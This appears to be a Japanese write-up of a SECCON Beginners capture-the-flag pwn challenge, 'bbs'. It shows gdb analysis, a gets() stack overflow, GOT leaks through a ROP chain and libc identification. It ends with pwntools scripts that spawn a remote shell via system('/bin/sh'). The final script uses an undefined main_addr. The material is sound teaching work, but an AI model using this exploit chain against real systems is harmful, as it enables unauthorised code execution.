<!-- TITLE: bbs -->
<!-- SUBTITLE: A quick summary of Bbs -->

# 問題概要
```
最近，BBSって言って掲示板だと伝わる人はどれくらいいるのでしょうね．

Host: pwn1.chall.beginners.seccon.jp
Port: 18373

https://score.beginners.seccon.jp/files/0c6414e595b3c4052c7e105e6164cb1f/bbs_3e897818670a0db55eaed8109b6a73f0e03d54e7
```

[bbs.tar.gz](/uploads/bin/bbs.tar.gz)


# 解析
## gdb

```console
gef> disas main
Dump of assembler code for function main:
   0x00000000004006a1 <+0>:	push   rbp
   0x00000000004006a2 <+1>:	mov    rbp,rsp
   0x00000000004006a5 <+4>:	add    rsp,0xffffffffffffff80
   0x00000000004006a9 <+8>:	mov    edi,0x400788
   0x00000000004006ae <+13>:	mov    eax,0x0
   0x00000000004006b3 <+18>:	call   0x400550 <printf@plt>
   0x00000000004006b8 <+23>:	lea    rax,[rbp-0x80]
   0x00000000004006bc <+27>:	mov    rdi,rax
   0x00000000004006bf <+30>:	mov    eax,0x0
   0x00000000004006c4 <+35>:	call   0x400570 <gets@plt>
   0x00000000004006c9 <+40>:	mov    edi,0x4007a0
   0x00000000004006ce <+45>:	call   0x400520 <puts@plt>
   0x00000000004006d3 <+50>:	mov    edi,0x4007c1
   0x00000000004006d8 <+55>:	call   0x400540 <system@plt>
   0x00000000004006dd <+60>:	lea    rax,[rbp-0x80]
   0x00000000004006e1 <+64>:	mov    rsi,rax
   0x00000000004006e4 <+67>:	mov    edi,0x4007c8
   0x00000000004006e9 <+72>:	mov    eax,0x0
   0x00000000004006ee <+77>:	call   0x400550 <printf@plt>
   0x00000000004006f3 <+82>:	mov    eax,0x0
   0x00000000004006f8 <+87>:	leave  
   0x00000000004006f9 <+88>:	ret    
End of assembler dump.
gef> checksec
[+] checksec for '/home/mkm/ctf/seccon_beginners/pwn_bbs/sandbox/bbs_3e897818670a0db55eaed8109b6a73f0e03d54e7'
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

`0x00000000004006c4 <+35>`で`gets`を呼んでいてかつ*stack canary*もないので、*stack overflow*の脆弱性がある用に思えるので、試してみる

```console
gef> pattern create 256
[+] Generating a pattern of 256 bytes
aaaaaaaabaaaaaaa...(snip)...faaaaaabgaaaaaab
[+] Saved as '$_gef1'
gef> r <<< $(python -c 'print "aaaaaaaabaaaaaaa...(snip)...faaaaaabgaaaaaab"')
(snip)
─────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "bbs_3e897818670", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006f9 → Name: main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef> x/gx $rsp
0x7fffffffdff8:	0x6161616161616172
gef> pattern search 0x6161616161616172
[+] Searching '0x6161616161616172'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search)
```

上の結果から、**136バイト**埋めるとその次に **$rsp** の値を任意の値に書き換えられる
ここからROPガジェットを使って任意の命令を実行していく

## ROPガジェットとGOT

```console
gef> ropper --search '% ?di'
(snip)
0x0000000000400763: pop rdi; ret;
gef> info functions
(snip)
0x0000000000400520  puts@plt
0x0000000000400530  setbuf@plt
0x0000000000400540  system@plt
0x0000000000400550  printf@plt
0x0000000000400560  __libc_start_main@plt
0x0000000000400570  gets@plt
(snip)
gef> disas 0x0000000000400540
Dump of assembler code for function system@plt:
   0x0000000000400540 <+0>:	jmp    QWORD PTR [rip+0x200ae2]        # 0x601028
   0x0000000000400546 <+6>:	push   0x2
   0x000000000040054b <+11>:	jmp    0x400510
End of assembler dump.

gef> disas 0x0000000000400520
Dump of assembler code for function puts@plt:
   0x0000000000400520 <+0>:	jmp    QWORD PTR [rip+0x200af2]        # 0x601018
   0x0000000000400526 <+6>:	push   0x0
   0x000000000040052b <+11>:	jmp    0x400510
End of assembler dump.

gef> disas 0x0000000000400570
Dump of assembler code for function gets@plt:
   0x0000000000400570 <+0>:	jmp    QWORD PTR [rip+0x200aca]        # 0x601040
   0x0000000000400576 <+6>:	push   0x5
   0x000000000040057b <+11>:	jmp    0x400510
End of assembler dump.
```

## libc version check
まずサーバの*libc*を調べる

```python
# -*- coding: utf-8 -*-
from pwn import *

popret = 0x0000000000400763
puts_plt = 0x0000000000400520
system_got = 0x601028
puts_got = 0x601018
gets_got = 0x601040

def upack(hexstr):
    return hex(u64(hexstr + ('\x00'*(8 - len(hexstr)))))

# popretでそれぞれのgotアドレスをレジスタに移して、puts@pltで呼び出し先のアドレスを出力
buf = ''
buf += 'A'*136
buf += p64(popret)
buf += p64(system_got)
buf += p64(puts_plt)
buf += p64(popret)
buf += p64(puts_got)
buf += p64(puts_plt)
buf += p64(popret)
buf += p64(gets_got)
buf += p64(puts_plt)

r = remote('pwn1.chall.beginners.seccon.jp', 18373)
r.recvuntil('Input Content : ')
r.sendline(buf)
a = r.recvall()
spl = a.split('\n')

hexaddrs = map(lambda x: upack(x), spl[-4:-1])
print 'system:', hexaddrs[0]
print 'puts  :', hexaddrs[1]
print 'gets  :', hexaddrs[2]
```

実行してみる

```console
$ python leak.py
[+] Opening connection to pwn1.chall.beginners.seccon.jp on port 18373: Done
[+] Receiving all data: Done (255B)
[*] Closed connection to pwn1.chall.beginners.seccon.jp port 18373
system: 0x7f684e70e390
puts  : 0x7f684e738690
gets  : 0x7f684e737d80
$ python leak.py 
[+] Opening connection to pwn1.chall.beginners.seccon.jp on port 18373: Done
[+] Receiving all data: Done (255B)
[*] Closed connection to pwn1.chall.beginners.seccon.jp port 18373
system: 0x7f5bf5f40390
puts  : 0x7f5bf5f6a690
gets  : 0x7f5bf5f69d80
```

2回実行してアドレスが異なるので、**ASLR**が有効になっていることがわかる
[libc-database](https://github.com/niklasb/libc-database)で該当するlibcを探す

```console
$ cd /path/to/libc-database
$ ./find system 390 puts 690 gets d80
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
$ ./dump libc6_2.23-0ubuntu10_amd64
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_dup2 = 0x00000000000f7970
offset_read = 0x00000000000f7250
offset_write = 0x00000000000f72b0
offset_str_bin_sh = 0x18cd57
```

# Exploit 

systemのアドレスがわかるので、*offset_system*から**libc_base**が判明する (`libc_base = system_addr - offset_system`)
libc_baseが判明した後は、mainにもう一度突入すれば判明したlibc_baseを変えることなくもう一度実行できる

```console
gef> x/x main
0x4006a1 <main>:	0x80c48348e5894855
```

スクリプトは以下
`r.recvall(timeout=5)`では失敗したので、for-loopを回しながら`r.recvline(timeout=1)`をする

```python
# -*- coding: utf-8 -*-
from pwn import *

offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_dup2 = 0x00000000000f7970
offset_read = 0x00000000000f7250
offset_write = 0x00000000000f72b0
offset_str_bin_sh = 0x18cd57

popret = 0x0000000000400763
puts_plt = 0x0000000000400520
system_got = 0x601028
puts_got = 0x601018
gets_got = 0x601040

# Stage 1: Leak libc_base then enter main again
buf = ''
buf += 'A'*136
buf += p64(popret)
buf += p64(system_got)
buf += p64(puts_plt)
buf += p64(main_addr)

r = remote('pwn1.chall.beginners.seccon.jp', 18373)
r.recvuntil('Input Content : ')
r.sendline(buf)
a = ''
for i in range(10):
    a += r.recvline(timeout=1)

spl = a.split('\n')
addr = spl[-2]
system = u64(addr + ('\x00'*(8 - len(addr))))
libc_base = system - offset_system
# Calculate /bin/sh address from libc_base and offset
binsh = libc_base + offset_str_bin_sh
print 'system   :', hex(system)
print 'libc_base:', hex(libc_base)
print 'binsh    :', hex(binsh)
print 'popret   :', hex(popret)

# Stage 2: Execute system("/bin/sh")
another_buf = ''
another_buf += 'A'*136
another_buf += p64(popret)
another_buf += p64(binsh)
another_buf += p64(system)

r.recvuntil('Input Content : ')
print '[@] RETURNED TO main'
r.sendline(another_buf)
r.interactive()
```
